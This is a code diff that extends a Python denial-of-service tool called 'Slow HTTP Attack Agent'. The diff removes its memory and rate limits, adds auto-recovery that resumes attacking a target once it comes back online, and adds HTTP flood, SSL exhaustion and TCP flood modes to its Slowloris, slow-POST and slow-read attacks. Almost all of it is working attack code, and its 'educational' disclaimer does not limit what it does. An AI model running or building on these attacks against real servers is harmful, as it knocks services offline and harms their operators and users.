@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Slow HTTP Attack Agent - Enhanced Version
+Slow HTTP Attack Agent - Enhanced Version with All Attack Methods
 Purpose: Educational and Authorized Penetration Testing Only
 
 ⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
@@ -20,6 +20,13 @@ from urllib.parse import urlparse
 from typing import Dict, List, Optional, Tuple
 from dataclasses import dataclass
 import json
+import ssl
+import struct
+
+# Version Information
+VERSION = "5.0"
+BUILD_DATE = "2025-01-04"
+AUTHOR = "NinjaTech Security Team"
 
 # Try to import optional dependencies
 try:
@@ -27,6 +34,18 @@ try:
     PSUTIL_AVAILABLE = True
 except ImportError:
     PSUTIL_AVAILABLE = False
+
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+
+try:
+    import dns.resolver
+    DNS_AVAILABLE = True
+except ImportError:
+    DNS_AVAILABLE = False
 
 # Configure logging
 logging.basicConfig(
@@ -88,81 +107,65 @@ class ThreadSafeStats:
             return self.stats.to_dict()
 
 
-class MemoryMonitor:
-    """Monitor and manage memory usage"""
+class TargetHealthMonitor:
+    """Monitor target health and handle reconnection"""
     
-    def __init__(self, max_memory_mb: int = 512):
-        self.max_memory_mb = max_memory_mb
-        self.enabled = PSUTIL_AVAILABLE
-    
-    def get_memory_usage(self) -> float:
-        """Get current memory usage in MB"""
-        if not self.enabled:
-            return 0.0
+    def __init__(self, host: str, port: int, use_ssl: bool = False):
+        self.host = host
+        self.port = port
+        self.use_ssl = use_ssl
+        self.is_alive = False
+        self.consecutive_failures = 0
+        self.max_failures_before_wait = 3
+        self.wait_time = 10  # seconds
         
+    def check_target(self) -> bool:
+        """Check if target is responsive"""
         try:
-            process = psutil.Process()
-            return process.memory_info().rss / 1024 / 1024
-        except Exception:
-            return 0.0
-    
-    def is_memory_limit_reached(self) -> bool:
-        """Check if memory limit is reached"""
-        if not self.enabled:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((self.host, self.port))
+            sock.close()
+            
+            if result == 0:
+                self.is_alive = True
+                self.consecutive_failures = 0
+                return True
+            else:
+                self.is_alive = False
+                self.consecutive_failures += 1
+                return False
+        except Exception as e:
+            self.is_alive = False
+            self.consecutive_failures += 1
+            logger.debug(f"Target check failed: {e}")
             return False
-        
-        return self.get_memory_usage() > self.max_memory_mb
     
-    def get_memory_percentage(self) -> float:
-        """Get memory usage as percentage of limit"""
-        if not self.enabled:
-            return 0.0
+    def wait_for_recovery(self):
+        """Wait for target to recover"""
+        logger.info(f"[RECOVERY] Target appears down. Waiting {self.wait_time}s before retry...")
+        time.sleep(self.wait_time)
         
-        return (self.get_memory_usage() / self.max_memory_mb) * 100
-
-
-class RateLimiter:
-    """Rate limiter to prevent overwhelming the system"""
-    
-    def __init__(self, max_rate: int = 1000, window: int = 1):
-        """
-        Initialize rate limiter.
+        # Try to check if target is back
+        retry_count = 0
+        max_retries = 5
         
-        Args:
-            max_rate: Maximum operations per window
-            window: Time window in seconds
-        """
-        self.max_rate = max_rate
-        self.window = window
-        self.operations = []
-        self._lock = threading.Lock()
-    
-    def can_proceed(self) -> bool:
-        """Check if operation can proceed"""
-        with self._lock:
-            current_time = time.time()
-            
-            # Remove old operations outside window
-            self.operations = [
-                op_time for op_time in self.operations
-                if current_time - op_time < self.window
-            ]
-            
-            # Check if under limit
-            if len(self.operations) < self.max_rate:
-                self.operations.append(current_time)
+        while retry_count < max_retries:
+            logger.info(f"[RECOVERY] Checking target status (attempt {retry_count + 1}/{max_retries})...")
+            if self.check_target():
+                logger.info("[RECOVERY] Target is back online! Resuming attack...")
                 return True
             
-            return False
-    
-    def wait_if_needed(self):
-        """Wait if rate limit is reached"""
-        while not self.can_proceed():
-            time.sleep(0.01)
+            retry_count += 1
+            if retry_count < max_retries:
+                time.sleep(self.wait_time)
+        
+        logger.warning("[RECOVERY] Target still down after multiple attempts")
+        return False
 
 
 class SlowHTTPAttack:
-    """Enhanced Slow HTTP Attack with proper resource management"""
+    """Enhanced Slow HTTP Attack with auto-recovery"""
     
     def __init__(
         self,
@@ -171,15 +174,6 @@ class SlowHTTPAttack:
         use_ssl: bool = False,
         max_memory_mb: int = 512
     ):
-        """
-        Initialize attack instance.
-        
-        Args:
-            host: Target host
-            port: Target port
-            use_ssl: Use SSL/TLS
-            max_memory_mb: Maximum memory usage in MB
-        """
         self.host = host
         self.port = port
         self.use_ssl = use_ssl
@@ -192,11 +186,8 @@ class SlowHTTPAttack:
         # Statistics
         self.stats = ThreadSafeStats()
         
-        # Memory monitoring
-        self.memory_monitor = MemoryMonitor(max_memory_mb)
-        
-        # Rate limiting
-        self.rate_limiter = RateLimiter(max_rate=1000, window=1)
+        # Health monitoring
+        self.health_monitor = TargetHealthMonitor(host, port, use_ssl)
         
         # User agents
         self.user_agents = [
@@ -209,45 +200,47 @@ class SlowHTTPAttack:
         logger.info(f"Initialized attack on {host}:{port} (SSL: {use_ssl})")
     
     def create_socket(self) -> Optional[socket.socket]:
-        """Create and connect socket"""
-        try:
-            # Check memory before creating socket
-            if self.memory_monitor.is_memory_limit_reached():
-                logger.warning("Memory limit reached, not creating new socket")
+        """Create and connect socket with retry logic"""
+        max_retries = 3
+        retry_count = 0
+        
+        while retry_count < max_retries:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(15)
+                sock.connect((self.host, self.port))
+                
+                if self.use_ssl:
+                    context = ssl.create_default_context()
+                    context.check_hostname = False
+                    context.verify_mode = ssl.CERT_NONE
+                    sock = context.wrap_socket(sock, server_hostname=self.host)
+                
+                return sock
+                
+            except (socket.timeout, socket.error, ConnectionRefusedError, OSError) as e:
+                retry_count += 1
+                logger.debug(f"Socket creation failed (attempt {retry_count}/{max_retries}): {e}")
+                
+                if retry_count >= max_retries:
+                    # Check if target is down
+                    if not self.health_monitor.check_target():
+                        logger.warning("[AUTO-RECOVERY] Target appears down, initiating recovery...")
+                        if self.health_monitor.wait_for_recovery():
+                            # Target recovered, reset retry count
+                            retry_count = 0
+                            continue
+                    
+                    self.stats.increment('error_count')
+                    return None
+                
+                time.sleep(1)
+            except Exception as e:
+                logger.error(f"Unexpected error creating socket: {e}")
+                self.stats.increment('error_count')
                 return None
-            
-            # Rate limit socket creation
-            self.rate_limiter.wait_if_needed()
-            
-            # Create socket
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(15)
-            
-            # Connect
-            sock.connect((self.host, self.port))
-            
-            # Wrap with SSL if needed
-            if self.use_ssl:
-                import ssl
-                context = ssl.create_default_context()
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                sock = context.wrap_socket(sock, server_hostname=self.host)
-            
-            return sock
-            
-        except socket.timeout:
-            logger.debug("Socket connection timeout")
-            self.stats.increment('error_count')
-            return None
-        except socket.error as e:
-            logger.debug(f"Socket error: {e}")
-            self.stats.increment('error_count')
-            return None
-        except Exception as e:
-            logger.error(f"Unexpected error creating socket: {e}")
-            self.stats.increment('error_count')
-            return None
+        
+        return None
     
     def close_socket(self, sock: socket.socket):
         """Safely close socket"""
@@ -256,50 +249,13 @@ class SlowHTTPAttack:
         except Exception:
             pass
     
-    def cleanup_dead_connections(self):
-        """Remove dead connections from list"""
-        with self.lock:
-            alive_conns = []
-            
-            for sock in self.conns:
-                try:
-                    # Try to send empty data to check if alive
-                    sock.send(b'')
-                    alive_conns.append(sock)
-                except Exception:
-                    # Connection dead, close it
-                    self.close_socket(sock)
-                    self.stats.decrement('connections_active')
-            
-            self.conns = alive_conns
-    
-    def reduce_connections(self, percentage: float = 0.25):
-        """Reduce number of connections by percentage"""
-        with self.lock:
-            num_to_close = int(len(self.conns) * percentage)
-            
-            for _ in range(num_to_close):
-                if self.conns:
-                    sock = self.conns.pop(0)
-                    self.close_socket(sock)
-                    self.stats.decrement('connections_active')
-            
-            logger.info(f"Reduced connections by {percentage*100}% ({num_to_close} closed)")
-    
     def slowloris_attack(
         self,
         num_conns: int = 100,
         delay: int = 15,
         duration: int = 0
     ):
-        """
-        Slowloris attack implementation.
-        
-        Args:
-            num_conns: Number of connections
-            delay: Delay between packets
-            duration: Attack duration (0 = unlimited)
-        """
+        """Slowloris attack with auto-recovery"""
         logger.info(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
         logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
         
@@ -322,15 +278,9 @@ class SlowHTTPAttack:
                 if not self.running:
                     break
                 
-                # Check memory
-                if self.memory_monitor.is_memory_limit_reached():
-                    logger.warning("Memory limit reached, reducing connections")
-                    self.reduce_connections(0.25)
-                
                 sock = self.create_socket()
                 if sock:
                     try:
-                        # Send incomplete HTTP request
                         request = self._build_slowloris_request()
                         sock.send(request.encode())
                         
@@ -349,15 +299,10 @@ class SlowHTTPAttack:
                         self.close_socket(sock)
                         self.stats.increment('error_count')
                 
-                # Small delay every 100 connections
                 if i % 100 == 0:
                     time.sleep(0.1)
             
             logger.info(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
-            
-            if not self.conns:
-                logger.error("No connections established, aborting attack")
-                return
             
             # Phase 2: Keep connections alive
             logger.info("[PHASE2] Starting keep-alive phase...")
@@ -370,14 +315,6 @@ class SlowHTTPAttack:
                     break
                 
                 cycle_count += 1
-                
-                # Check memory and cleanup if needed
-                if self.memory_monitor.is_memory_limit_reached():
-                    logger.warning("Memory limit reached, cleaning up")
-                    self.cleanup_dead_connections()
-                    self.reduce_connections(0.25)
-                
-                # Send keep-alive headers
                 failed_socks = []
                 
                 with self.lock:
@@ -388,7 +325,6 @@ class SlowHTTPAttack:
                         break
                     
                     try:
-                        # Send partial header
                         header = self._build_partial_header()
                         sock.send(header.encode())
                         
@@ -426,16 +362,12 @@ class SlowHTTPAttack:
                 
                 # Print status
                 stats = self.stats.get_all()
-                memory_pct = self.memory_monitor.get_memory_percentage()
-                
                 logger.info(
                     f"[CYCLE {cycle_count}] Active: {stats['connections_active']} | "
                     f"Packets: {stats['packets_sent']} | "
-                    f"Errors: {stats['error_count']} | "
-                    f"Memory: {memory_pct:.1f}%"
+                    f"Errors: {stats['error_count']}"
                 )
                 
-                # Sleep before next cycle
                 time.sleep(delay)
         
         finally:
@@ -448,14 +380,7 @@ class SlowHTTPAttack:
         delay: int = 10,
         duration: int = 0
     ):
-        """
-        Slow POST (R.U.D.Y) attack implementation.
-        
-        Args:
-            num_conns: Number of connections
-            delay: Delay between packets
-            duration: Attack duration (0 = unlimited)
-        """
+        """Slow POST (R.U.D.Y) attack with auto-recovery"""
         logger.info(f"[R.U.D.Y] Starting Slow POST attack on {self.host}:{self.port}")
         logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
         
@@ -471,24 +396,18 @@ class SlowHTTPAttack:
         signal.signal(signal.SIGTERM, signal_handler)
         
         try:
-            # Create initial connections with POST headers
-            logger.info("[PHASE1] Creating POST connections...")
-            
             content_length = random.randint(10000000, 100000000)
+            
+            # Create initial connections
+            logger.info("[PHASE1] Creating POST connections...")
             
             for i in range(num_conns):
                 if not self.running:
                     break
                 
-                # Check memory
-                if self.memory_monitor.is_memory_limit_reached():
-                    logger.warning("Memory limit reached, reducing connections")
-                    self.reduce_connections(0.25)
-                
                 sock = self.create_socket()
                 if sock:
                     try:
-                        # Send POST request with large content-length
                         request = self._build_slow_post_request(content_length)
                         sock.send(request.encode())
                         
@@ -512,29 +431,16 @@ class SlowHTTPAttack:
             
             logger.info(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
             
-            if not self.conns:
-                logger.error("No connections established, aborting attack")
-                return
-            
             # Phase 2: Send data slowly
-            logger.info("[PHASE2] Sending POST data slowly...")
+            logger.info("[PHASE2] Starting slow data transmission...")
             cycle_count = 0
             
             while self.running:
-                # Check duration
                 if duration > 0 and (time.time() - start_time) >= duration:
                     logger.info("Duration limit reached, stopping attack")
                     break
                 
                 cycle_count += 1
-                
-                # Check memory
-                if self.memory_monitor.is_memory_limit_reached():
-                    logger.warning("Memory limit reached, cleaning up")
-                    self.cleanup_dead_connections()
-                    self.reduce_connections(0.25)
-                
-                # Send small data chunks
                 failed_socks = []
                 
                 with self.lock:
@@ -545,12 +451,12 @@ class SlowHTTPAttack:
                         break
                     
                     try:
-                        # Send tiny data chunk
-                        data_chunk = random.choice(string.ascii_lowercase) + "="
-                        sock.send(data_chunk.encode())
+                        # Send one byte of data
+                        data = random.choice(string.ascii_letters).encode()
+                        sock.send(data)
                         
                         self.stats.increment('packets_sent')
-                        self.stats.increment('bytes_sent', len(data_chunk))
+                        self.stats.increment('bytes_sent', 1)
                     
                     except Exception:
                         failed_socks.append(sock)
@@ -565,7 +471,6 @@ class SlowHTTPAttack:
                     self.close_socket(sock)
                     self.stats.decrement('connections_active')
                     
-                    # Try to create replacement
                     new_sock = self.create_socket()
                     if new_sock:
                         try:
@@ -581,18 +486,13 @@ class SlowHTTPAttack:
                         except Exception:
                             self.close_socket(new_sock)
                 
-                # Print status
                 stats = self.stats.get_all()
-                memory_pct = self.memory_monitor.get_memory_percentage()
-                
                 logger.info(
                     f"[CYCLE {cycle_count}] Active: {stats['connections_active']} | "
                     f"Packets: {stats['packets_sent']} | "
-                    f"Errors: {stats['error_count']} | "
-                    f"Memory: {memory_pct:.1f}%"
+                    f"Errors: {stats['error_count']}"
                 )
                 
-                # Sleep before next cycle
                 time.sleep(delay)
         
         finally:
@@ -601,18 +501,11 @@ class SlowHTTPAttack:
     
     def slow_read_attack(
         self,
-        num_conns: int = 50,
+        num_conns: int = 100,
         delay: int = 10,
         duration: int = 0
     ):
-        """
-        Slow Read attack implementation.
-        
-        Args:
-            num_conns: Number of connections
-            delay: Delay between reads
-            duration: Attack duration (0 = unlimited)
-        """
+        """Slow Read attack with auto-recovery"""
         logger.info(f"[SLOW-READ] Starting attack on {self.host}:{self.port}")
         logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
         
@@ -628,17 +521,11 @@ class SlowHTTPAttack:
         signal.signal(signal.SIGTERM, signal_handler)
         
         try:
-            # Create initial connections
-            logger.info("[PHASE1] Creating connections with small receive buffer...")
+            logger.info("[PHASE1] Creating connections...")
             
             for i in range(num_conns):
                 if not self.running:
                     break
-                
-                # Check memory
-                if self.memory_monitor.is_memory_limit_reached():
-                    logger.warning("Memory limit reached, reducing connections")
-                    self.reduce_connections(0.25)
                 
                 sock = self.create_socket()
                 if sock:
@@ -646,7 +533,6 @@ class SlowHTTPAttack:
                         # Set small receive buffer
                         sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                         
-                        # Send complete request
                         request = self._build_complete_request()
                         sock.send(request.encode())
                         
@@ -657,42 +543,29 @@ class SlowHTTPAttack:
                         self.stats.increment('packets_sent')
                         self.stats.increment('bytes_sent', len(request))
                         
-                        if (i + 1) % 50 == 0:
+                        if (i + 1) % 100 == 0:
                             logger.info(f"[PROGRESS] {i+1}/{num_conns} connections created")
                     
                     except Exception as e:
-                        logger.debug(f"Error creating slow-read connection: {e}")
+                        logger.debug(f"Error creating slow read connection: {e}")
                         self.close_socket(sock)
                         self.stats.increment('error_count')
                 
-                if i % 50 == 0:
+                if i % 100 == 0:
                     time.sleep(0.1)
             
             logger.info(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
             
-            if not self.conns:
-                logger.error("No connections established, aborting attack")
-                return
-            
-            # Phase 2: Read data slowly
-            logger.info("[PHASE2] Reading data slowly...")
+            # Phase 2: Read slowly
+            logger.info("[PHASE2] Starting slow read phase...")
             cycle_count = 0
             
             while self.running:
-                # Check duration
                 if duration > 0 and (time.time() - start_time) >= duration:
                     logger.info("Duration limit reached, stopping attack")
                     break
                 
                 cycle_count += 1
-                
-                # Check memory
-                if self.memory_monitor.is_memory_limit_reached():
-                    logger.warning("Memory limit reached, cleaning up")
-                    self.cleanup_dead_connections()
-                    self.reduce_connections(0.25)
-                
-                # Read tiny amounts of data
                 failed_socks = []
                 
                 with self.lock:
@@ -703,10 +576,11 @@ class SlowHTTPAttack:
                         break
                     
                     try:
-                        # Read 1 byte
+                        # Read one byte slowly
                         sock.recv(1)
+                        self.stats.increment('packets_sent')
+                    
                     except socket.timeout:
-                        # Timeout is expected and good
                         pass
                     except Exception:
                         failed_socks.append(sock)
@@ -721,7 +595,6 @@ class SlowHTTPAttack:
                     self.close_socket(sock)
                     self.stats.decrement('connections_active')
                     
-                    # Try to create replacement
                     new_sock = self.create_socket()
                     if new_sock:
                         try:
@@ -738,19 +611,208 @@ class SlowHTTPAttack:
                         except Exception:
                             self.close_socket(new_sock)
                 
-                # Print status
                 stats = self.stats.get_all()
-                memory_pct = self.memory_monitor.get_memory_percentage()
-                
                 logger.info(
                     f"[CYCLE {cycle_count}] Active: {stats['connections_active']} | "
                     f"Packets: {stats['packets_sent']} | "
-                    f"Errors: {stats['error_count']} | "
-                    f"Memory: {memory_pct:.1f}%"
+                    f"Errors: {stats['error_count']}"
                 )
                 
-                # Sleep before next cycle
                 time.sleep(delay)
+        
+        finally:
+            self.stop_attack()
+            logger.info("[COMPLETE] Attack finished")
+    
+    def http_flood_attack(
+        self,
+        num_conns: int = 100,
+        requests_per_conn: int = 100,
+        duration: int = 0
+    ):
+        """HTTP Flood attack with auto-recovery"""
+        logger.info(f"[HTTP-FLOOD] Starting attack on {self.host}:{self.port}")
+        logger.info(f"[CONFIG] Connections: {num_conns}, Requests/conn: {requests_per_conn}, Duration: {duration}s")
+        
+        self.running = True
+        start_time = time.time()
+        
+        def signal_handler(sig, frame):
+            logger.info("Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        def flood_worker():
+            """Worker thread for flooding"""
+            while self.running:
+                if duration > 0 and (time.time() - start_time) >= duration:
+                    break
+                
+                sock = self.create_socket()
+                if sock:
+                    try:
+                        for _ in range(requests_per_conn):
+                            if not self.running:
+                                break
+                            
+                            request = self._build_complete_request()
+                            sock.send(request.encode())
+                            
+                            self.stats.increment('packets_sent')
+                            self.stats.increment('bytes_sent', len(request))
+                        
+                        self.close_socket(sock)
+                    
+                    except Exception:
+                        self.stats.increment('error_count')
+                        self.close_socket(sock)
+        
+        try:
+            logger.info("[STARTING] Launching flood threads...")
+            
+            threads = []
+            for i in range(num_conns):
+                t = threading.Thread(target=flood_worker)
+                t.daemon = True
+                t.start()
+                threads.append(t)
+            
+            # Monitor progress
+            while self.running and any(t.is_alive() for t in threads):
+                if duration > 0 and (time.time() - start_time) >= duration:
+                    logger.info("Duration limit reached, stopping attack")
+                    self.running = False
+                    break
+                
+                stats = self.stats.get_all()
+                logger.info(
+                    f"[STATUS] Packets: {stats['packets_sent']} | "
+                    f"Bytes: {stats['bytes_sent']} | "
+                    f"Errors: {stats['error_count']}"
+                )
+                
+                time.sleep(5)
+            
+            # Wait for threads
+            for t in threads:
+                t.join(timeout=1)
+        
+        finally:
+            self.stop_attack()
+            logger.info("[COMPLETE] Attack finished")
+    
+    def ssl_exhaust_attack(
+        self,
+        num_conns: int = 100,
+        delay: int = 1,
+        duration: int = 0
+    ):
+        """SSL Exhaustion attack with auto-recovery"""
+        if not self.use_ssl:
+            logger.error("SSL Exhaustion requires SSL/TLS target")
+            return
+        
+        logger.info(f"[SSL-EXHAUST] Starting attack on {self.host}:{self.port}")
+        logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
+        
+        self.running = True
+        start_time = time.time()
+        
+        def signal_handler(sig, frame):
+            logger.info("Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        try:
+            cycle_count = 0
+            
+            while self.running:
+                if duration > 0 and (time.time() - start_time) >= duration:
+                    logger.info("Duration limit reached, stopping attack")
+                    break
+                
+                cycle_count += 1
+                
+                # Create SSL connections rapidly
+                for i in range(num_conns):
+                    if not self.running:
+                        break
+                    
+                    sock = self.create_socket()
+                    if sock:
+                        self.stats.increment('connections_active')
+                        self.close_socket(sock)
+                        self.stats.decrement('connections_active')
+                        self.stats.increment('packets_sent')
+                
+                stats = self.stats.get_all()
+                logger.info(
+                    f"[CYCLE {cycle_count}] SSL Handshakes: {stats['packets_sent']} | "
+                    f"Errors: {stats['error_count']}"
+                )
+                
+                time.sleep(delay)
+        
+        finally:
+            self.stop_attack()
+            logger.info("[COMPLETE] Attack finished")
+    
+    def tcp_flood_attack(
+        self,
+        target_port: int,
+        num_packets: int = 1000,
+        duration: int = 0
+    ):
+        """TCP Flood attack with auto-recovery"""
+        logger.info(f"[TCP-FLOOD] Starting attack on {self.host}:{target_port}")
+        logger.info(f"[CONFIG] Packets: {num_packets}, Duration: {duration}s")
+        
+        self.running = True
+        start_time = time.time()
+        
+        def signal_handler(sig, frame):
+            logger.info("Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        try:
+            cycle_count = 0
+            
+            while self.running:
+                if duration > 0 and (time.time() - start_time) >= duration:
+                    logger.info("Duration limit reached, stopping attack")
+                    break
+                
+                cycle_count += 1
+                
+                for i in range(num_packets):
+                    if not self.running:
+                        break
+                    
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(1)
+                        sock.connect((self.host, target_port))
+                        sock.close()
+                        
+                        self.stats.increment('packets_sent')
+                    
+                    except Exception:
+                        self.stats.increment('error_count')
+                
+                stats = self.stats.get_all()
+                logger.info(
+                    f"[CYCLE {cycle_count}] TCP Packets: {stats['packets_sent']} | "
+                    f"Errors: {stats['error_count']}"
+                )
+                
+                time.sleep(0.1)
         
         finally:
             self.stop_attack()
@@ -805,7 +867,6 @@ class SlowHTTPAttack:
         """Stop attack and cleanup"""
         self.running = False
         
-        # Close all connections
         with self.lock:
             for sock in self.conns:
                 self.close_socket(sock)
@@ -813,7 +874,6 @@ class SlowHTTPAttack:
         
         self.stats.set('connections_active', 0)
         
-        # Print final stats
         final_stats = self.stats.get_all()
         logger.info(f"[FINAL STATS] {json.dumps(final_stats, indent=2)}")
 
@@ -821,13 +881,16 @@ class SlowHTTPAttack:
 def main():
     """Main entry point"""
     parser = argparse.ArgumentParser(
-        description="Slow HTTP Attack Agent - Enhanced Version",
+        description=f"Slow HTTP Attack Agent v{VERSION} - Enhanced Version",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
   %(prog)s --target example.com --attack slowloris
   %(prog)s --target https://example.com --attack slow_post --connections 50
   %(prog)s --target example.com --port 8080 --attack slow_read --duration 300
+  %(prog)s --target example.com --attack http_flood --connections 100
+  %(prog)s --target https://example.com --attack ssl_exhaust
+  %(prog)s --target example.com --attack tcp_flood --port 80
 
 ⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!
         """
@@ -838,7 +901,7 @@ Examples:
     parser.add_argument('--ssl', action='store_true', help='Use SSL/TLS')
     parser.add_argument(
         '--attack',
-        choices=['slowloris', 'slow_post', 'slow_read'],
+        choices=['slowloris', 'slow_post', 'slow_read', 'http_flood', 'ssl_exhaust', 'tcp_flood'],
         default='slowloris',
         help='Attack type (default: slowloris)'
     )
@@ -846,7 +909,7 @@ Examples:
     parser.add_argument('--delay', type=int, default=15, help='Delay between packets in seconds (default: 15)')
     parser.add_argument('--duration', type=int, default=0, help='Attack duration in seconds (0 = unlimited)')
     parser.add_argument('--max-memory', type=int, default=512, help='Maximum memory usage in MB (default: 512)')
-    parser.add_argument('--version', action='version', version='%(prog)s 2.0')
+    parser.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')
     parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
     
     args = parser.parse_args()
@@ -892,6 +955,12 @@ Examples:
             attacker.slow_post_attack(args.connections, args.delay, args.duration)
         elif args.attack == 'slow_read':
             attacker.slow_read_attack(args.connections, args.delay, args.duration)
+        elif args.attack == 'http_flood':
+            attacker.http_flood_attack(args.connections, 100, args.duration)
+        elif args.attack == 'ssl_exhaust':
+            attacker.ssl_exhaust_attack(args.connections, args.delay, args.duration)
+        elif args.attack == 'tcp_flood':
+            attacker.tcp_flood_attack(port, 1000, args.duration)
     
     except KeyboardInterrupt:
         print("\n[INTERRUPTED] Stopping attack...")
